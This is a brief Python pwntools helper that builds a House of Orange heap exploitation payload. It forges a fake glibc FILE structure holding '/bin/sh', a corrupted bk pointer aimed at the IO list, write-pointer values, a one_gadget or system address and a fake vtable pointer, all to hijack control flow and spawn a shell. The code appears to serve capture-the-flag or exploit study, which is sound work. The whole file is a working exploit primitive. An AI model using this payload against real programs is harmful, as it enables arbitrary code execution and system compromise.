from pwn import *

def hog(IO_list, ptr, fun):
	payload = '/bin/sh\x00'
	payload += p64(0x61) # size
	payload += p64(0)
	payload += p64(IO_list - 16) # bk
	payload += p64(2) #_IO_write_base
	payload += p64(3) # _IO_write_ptr
	payload += p64(fun) # one_gadget or system
	payload = payload.ljust(0xc0, '\x00') 
	payload += p64(0) # _mode
	payload = payload.ljust(0xd8,'\x00')
	payload += p64(ptr+24) # vtable
	return payload

